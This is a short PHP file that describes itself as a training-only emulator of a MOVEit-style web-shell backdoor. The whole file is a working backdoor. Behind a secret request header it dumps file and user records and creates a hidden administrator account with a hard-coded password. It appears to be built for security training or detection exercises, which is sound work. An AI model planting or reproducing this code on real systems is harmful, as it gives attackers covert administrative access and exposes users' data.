<?php
/*
 * Training-only MOVEit-inspired backdoor emulator.
 * Deliberately limited to application data operations; it does NOT execute OS commands.
 */
require_once '/var/www/src/db.php';
header('Content-Type: application/json; charset=utf-8');
$key=$_SERVER['HTTP_X_MFT_KEY'] ?? '';
if(!hash_equals('lemur-demo-key',$key)) { http_response_code(404); echo json_encode(['error'=>'not found']); exit; }
$action=$_GET['action'] ?? 'list';
if($action==='list'){
    echo json_encode(db()->query('SELECT id,owner_id,original_name,storage_name,created_at FROM files ORDER BY id')->fetchAll(), JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE);
    exit;
}
if($action==='users'){
    echo json_encode(db()->query('SELECT id,username,role,created_at FROM users ORDER BY id')->fetchAll(), JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE);
    exit;
}
if($action==='create_user'){
    $name=$_GET['name'] ?? 'svc_backup';
    $hash=password_hash('Temp1234!', PASSWORD_DEFAULT);
    $st=db()->prepare("INSERT INTO users(username,password_hash,role) VALUES(?,?,'admin')");
    $st->execute([$name,$hash]);
    echo json_encode(['created'=>$name]);
    exit;
}
http_response_code(400); echo json_encode(['error'=>'unknown action']);
